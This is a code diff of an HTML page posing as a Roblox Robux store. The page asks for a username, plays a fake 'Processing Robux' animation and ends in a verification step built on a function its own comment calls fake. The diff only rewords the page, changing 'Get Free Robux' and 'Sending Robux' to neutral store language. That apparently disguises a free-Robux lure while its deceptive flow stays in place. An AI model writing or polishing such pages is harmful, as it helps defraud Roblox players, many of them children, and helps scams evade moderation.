@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Roblox - Get Free Robux</title>
+    <title>Roblox - Robux Store</title>
     <link rel="icon" type="image/x-icon" href="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700458ba7cab444a522b7c8e71b8233099cf2c.png" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -541,7 +541,7 @@
                 </div>
                 <p class="maintxt">
                     <i class="fas fa-gem" style="color: #00b06f; margin-right: 6px;"></i>
-                    Get free Robux! Enter your username and get started.
+                    Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.
                 </p>
                 <span class="title">👤 Username</span>
                 <input type="text" class="username" placeholder="e.g. Sofiatata26" />
@@ -604,7 +604,7 @@
                 <div class="loeader">
                     <img class="fade-image" src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="sending" />
                 </div>
-                <p class="animationtxt" id="sendingText">📤 Sending Robux...</p>
+                <p class="animationtxt" id="sendingText">📤 Processing your request...</p>
             </div>
 
             <!-- Step 5: Verify -->
@@ -642,7 +642,7 @@
 
     <!-- ===== FOOTER ===== -->
     <footer class="footer">
-        <span>© 2025 Roblox Promo</span>
+        <span>© 2025 Roblox Store</span>
         <p>
             This is a copyrighted website. Any unauthorized use could result in a lawsuit under <strong>DMCA</strong>.
         </p>
@@ -705,7 +705,7 @@
                     const username = usernameInput.value.trim() || 'user';
 
                     // Go to step 4 (sending)
-                    sendingText.innerHTML = `📤 Sending <b>${amount}</b> Robux to <b>${username}</b> ...`;
+                    sendingText.innerHTML = `📤 Processing <b>${amount}</b> Robux for <b>${username}</b> ...`;
                     showStep(step4);
 
                     setTimeout(() => {
@@ -739,7 +739,7 @@
 
             // ---- Fake _rp() for verify ----
             window._rp = function() {
-                alert('✅ Verification successful! Robux will be added to your account soon.');
+                alert('✅ Verification successful! Your request will be processed soon.');
                 // You can reset the interface here if needed
                 // showStep(step1);
             };
